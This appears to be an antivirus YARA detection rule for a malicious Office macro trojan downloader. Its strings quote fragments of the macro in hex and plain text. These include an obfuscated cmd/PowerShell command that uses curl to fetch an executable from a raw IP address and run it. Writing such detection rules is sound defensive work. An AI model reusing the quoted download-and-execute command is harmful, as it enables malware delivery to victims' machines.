
rule TrojanDownloader_O97M_Powdow_STN_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.STN!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {6a 6f 68 6e 74 68 65 72 6f 63 6b 20 3d 20 22 61 66 44 35 2d 73 68 37 68 37 61 75 39 73 66 64 22 } //1 johntherock = "afD5-sh7h7au9sfd"
		$a_01_1 = {72 69 63 6b 74 68 65 64 69 20 3d 20 22 64 38 73 61 73 61 44 37 30 41 2d 34 33 64 38 73 61 73 61 42 2d 64 38 73 61 73 61 41 34 32 2d 39 64 38 73 61 73 61 34 22 } //1 rickthedi = "d8sasaD70A-43d8sasaB-d8sasaA42-9d8sasa4"
		$a_01_2 = {64 75 34 69 20 3d 20 65 64 7a 78 66 76 79 71 20 26 20 22 6c 69 63 5c 37 38 34 35 36 31 32 33 33 34 39 38 34 36 35 31 33 32 2e 65 78 65 22 } //1 du4i = edzxfvyq & "lic\784561233498465132.exe"
		$a_01_3 = {67 6f 64 6b 6e 6f 77 73 20 3d 20 52 65 70 6c 61 63 65 28 22 63 6d 64 20 2f 63 20 70 6f 77 5e 65 64 7a 78 66 76 79 71 72 73 5e 68 65 64 7a 78 66 76 79 71 6c 6c 2f 57 20 30 31 20 63 5e 75 5e 72 6c 20 68 74 74 5e 70 3a 2f 2f 31 31 36 2e 32 30 32 2e 31 32 2e 36 39 2f 61 61 61 2e 65 64 7a 78 66 76 79 71 5e 78 65 64 7a 78 66 76 79 71 20 2d 6f 20 22 20 26 20 64 75 34 69 20 26 20 22 3b 22 20 26 20 64 75 34 69 2c 20 22 65 64 7a 78 66 76 79 71 22 2c 20 22 65 22 29 } //1 godknows = Replace("cmd /c pow^edzxfvyqrs^hedzxfvyqll/W 01 c^u^rl htt^p://116.202.12.69/aaa.edzxfvyq^xedzxfvyq -o " & du4i & ";" & du4i, "edzxfvyq", "e")
		$a_01_4 = {75 76 68 67 73 6f 2e 65 78 65 63 20 67 6f 64 6b 6e 6f 77 73 } //1 uvhgso.exec godknows
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}